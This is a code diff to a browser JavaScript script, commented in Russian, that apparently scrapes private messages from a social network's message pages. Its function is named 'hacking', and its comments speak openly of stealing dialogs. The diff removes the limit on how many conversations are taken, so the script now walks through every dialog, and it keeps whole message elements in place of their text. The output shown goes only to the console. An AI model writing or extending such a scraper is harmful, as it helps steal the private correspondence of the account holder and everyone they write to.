@@ -70,7 +70,7 @@ function getFriendName() {
 function getMessages() {
     let messages = [];
     document.querySelectorAll('.im-mess--text').forEach(mess =>
-        messages.push(mess.textContent)
+        messages.push(mess)
     );
     return messages;
 }
@@ -100,11 +100,14 @@ async function hacking() {
 
     let dialogsIds = getDialogsIDs(); // получаем id диалогов, чтобы можно было по ним пройтись циклом
     let dialogsCount = dialogsIds.length; // кол-во диалогов
-    let count_to_parse = 10; // сколько нужно украсть диалогов
     let i = 0; // номер текущего диалога в массиве id
 
     // ===== PARSE DIALOGS ===== //
     let parser = setInterval(() => {
+        // data is end
+        if (!dialogsIds) return;
+        if (!dialogsIds[i]) return;
+
         // переходим к следующиму диалогу
         goToDialog(dialogsIds[i]['list-id']);
 
@@ -117,13 +120,5 @@ async function hacking() {
         console.log(dialogsData);
 
         i++; // увеличиваем i, чтобы перейти к след. диалогу
-
-        if (count_to_parse <= 0) {
-            // прекращаем кражу данных, когда украдем достаточно)
-            clearInterval(parser);
-            // clearInterval(saver);
-        }
-        count_to_parse--;
-
     }, 2000);
 }
